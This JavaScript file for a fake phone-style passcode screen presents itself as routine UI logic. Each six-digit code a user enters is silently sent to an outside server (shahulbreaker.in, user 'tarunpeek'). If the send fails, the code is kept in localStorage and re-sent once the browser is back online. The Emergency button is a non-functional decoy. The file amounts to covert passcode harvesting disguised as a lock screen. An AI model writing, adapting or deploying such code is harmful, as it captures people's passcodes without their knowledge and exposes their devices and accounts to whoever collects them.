
// app.js - passcode UI logic (unchanged behaviour)
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 6;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  // numeric keys only (has data-num)
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');

  function refreshDots(){
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }
  function reset(){
    code = ""; refreshDots();
  }
  function queuePass(pass){
    const q = JSON.parse(localStorage.getItem('_pass_queue_') || '[]');
    q.push({pass, ts: Date.now()});
    localStorage.setItem('_pass_queue_', JSON.stringify(q));
  }
  function sendToAPI(pass){
    const url = API_BASE + encodeURIComponent(pass);
    fetch(url, { method: 'GET', keepalive: true }).catch(() => queuePass(pass));
  }
  function flushQueue(){
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  keys.forEach(k => k.addEventListener('click', () => {
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();
    if (code.length === MAX) {
      setTimeout(() => { sendToAPI(code); reset(); }, 220);
    }
  }));

  // emergency: visual only
  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // cancel clears input
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // debug helper
  window.__passUI = { getCode: ()=>code, reset };
})();


